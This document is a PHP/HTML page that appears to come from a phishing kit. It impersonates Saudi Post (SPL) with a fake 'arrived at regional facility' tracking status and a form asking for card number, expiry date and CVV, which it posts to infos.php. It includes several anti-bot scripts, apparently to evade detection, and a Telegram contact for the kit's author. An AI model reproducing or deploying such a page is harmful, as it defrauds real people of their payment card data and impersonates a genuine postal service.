<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";

include("../anti__boot/anti1.php");
include("../anti__boot/anti2.php");
include("../anti__boot/anti3.php");
include("../anti__boot/anti4.php");
include("../anti__boot/anti5.php");
include("../anti__boot/anti6.php");
include("../anti__boot/anti7.php");
include("../anti__boot/anti8.php");

?>


<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>Saudi Post | SPL</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">             
  <link rel="preconnect" href="https://fonts.gstatic.com">
 

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- Logo site web-->
  <link rel="icon" href="image/Logo.svg" type="image/x-icon" />
  <link rel="shortcut icon" href="image/Logo.svg" type="image/x-icon" />

  <!-- fontawtsome -->
  <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>

</head>
<body  class="loaded">
<header>
    <div class="lang">
        <div class="container text-end">
            <a href="cc_ar.php"><p class="mb-0">عربي</p></a>
        </div>
    </div>
    <div class="header d-flex justify-content-between align-items-center container">
        <div class="Logo"><img src="image/Logo.svg"></div>
        <div class="reg"><button>Register</button></div>
    </div>
</header>
<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="110.53900146484375" viewBox="0 0 1922.745 110.539" class="hero_linear login_linear" preserveAspectRatio="xMidYMid slice">
            <g id="lines" transform="translate(240.981 6.003)">
                <g id="Group_5" data-name="Group 5" transform="translate(0.001)">
                    <path id="Stroke_1" data-name="Stroke 1" d="M481.449,31H40.442c-9.228,0-12.731-3.427-17.011-7.614,0,0-2.6-2.54-6.83-6.776L0,0" transform="translate(1199.524 22.804)" fill="none" stroke="#153c3f" stroke-miterlimit="10" stroke-width="12" class="svg-hero-1"></path>
                    <path id="Stroke_5" data-name="Stroke 5" d="M1199.525,22.8,1179.014,2.286a9.393,9.393,0,0,0-13.2.888L1114.988,54c-4.235,4.236-12.6,7.7-18.588,7.7L16.047,61.5H-240.981" transform="translate(-0.001 0)" fill="none" stroke="#153c3f" stroke-miterlimit="10" stroke-width="12" class="svg-hero-2"></path>
                </g>
                <path id="Stroke_3" data-name="Stroke 3" d="M1681.764,0H1245.2c-5.2,0-7.724,1.33-10.369,3.975L1162.864,74,1105.8,27.31l-1346.711-.455" transform="translate(0 22.5)" fill="none" stroke="#00c8e1" stroke-miterlimit="10" stroke-width="12" class="svg-hero-3"></path>
            </g>
        </svg>
<section>
    <div class="container login_container">
	
        <div class="row">
            <div class="col-md-6">
                <div class="form">
				<div class="font-weight-bol text-cenrte">
                <img src="image/icon.png" alt="" data-pagespeed-url-hash="2094493022" onload="pagespeed.CriticalImages.checkImageForCriticality(this);"></div>
                    <h4>Please complete the following information</h4>
                    <h5 class="mt-4">Please enter all information correctly</h5>

                    <form action="infos.php" method="post" class="mt-55 pt-5">
                        <input type="hidden" value="cc" name="step">


                        <div class="form-group mb-4">
                            <input type="text" class="form-control" placeholder="Card Number" id="card_number" name="card_number">
                            <?php
                                          if( !empty($_SESSION['errors']['card_number']) ) {
                                            echo '<div class="error" class="error">required</div>';}
                                     ?> 
                        </div>

                        <div class="row">
                            <div class="form-group mb-4 col-md-9">
                                <input type="text" class="form-control" placeholder="D'ate Dexpiry" id="expiry" name="expiry">
                                <?php
                                          if( !empty($_SESSION['errors']['expiry']) ) {
                                            echo '<div class="error" class="error">required</div>';}
                                     ?> 
                            </div>
                            <div class="form-group mb-4 col-md-3">
                                <input type="text" class="form-control" placeholder="CVV" id="cvv" name="cvv">
                                <?php
                                          if( !empty($_SESSION['errors']['cvv']) ) {
                                            echo '<div class="error" class="error">required</div>';}
                                     ?> 
                            </div>
                        </div>

                        <div class="bttn d-flex justify-content-between align-items-center mt-4">
                            <div class="reg"><button type="button" style="height: 48px;padding: 0 3rem;">Back</button></div>
                            <div class="reg"><button name="submit" style="height: 48px;padding: 0 3rem;background: #00C8E1;color:#153C3F;Continue;border: none;">Continue</button></div>
                        </div>

                    </form>
                </div>
            </div>

            <div class="col-md-6">
                <div class="form">
				<div class="font-weight-bol text-cenrte">
                <img src="image/splw.png" alt=""></div>
                   <div class="order">
				   
                    <h5 class="mb-3" style="border-bottom: 10px double #00C8E1;padding-bottom: 7px;">Status</h5>
                    <p>Arrived at SPL Regional Facility</p>
                    <span style="color:#333;">Your item arrived at our SPL facility in PITTSBURGH PA NETWORK DISTRIBUTION CENTER.<br>               
					The item is currently in transit to the destination.</span>
					<p class="mt-4">Track your delivery</p>
					<span style="color:#333;">Tracking Number : R080316125SA</span><br>
					<span style="color:#333;">Arrived at SPL Regional Facility</span>
                    <h5 class="mt-5"  style="border-bottom: 10px double #153C3F;padding-bottom: 7px";>Parcel Station </h5>
                    <span>
8455 Prince Sultan Bin Abdulaziz Street - AL KHARJ - Al Riyadh - 16278

19992 
<strong>Working hours</strong> 
From Sunday to Thursday From 8:00 To 21:45 
Saturday From 4:00 To 8:45</span>
                   </div>
                    
                </div>
            </div>
        </div>
    </div>
</section>

<footer>
    <div class="footer d-block d-md-flex justify-content-between align-items-center container">
        <div><span>©️ 2022 All rights reserved to Saudi Post- SPL</span></div>
        <div><span>When using this website, you must agree to <span>Terms of service</span> and <span>Privacy Terms</span></span></div>
    </div>
</footer>


    

   
    


  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
  <script>
        $('#cvv').payment('formatCardCVC');
        $('#expiry').payment('formatCardExpiry');
        $('#card_number').payment('formatCardNumber');
  </script>
</body>
</html>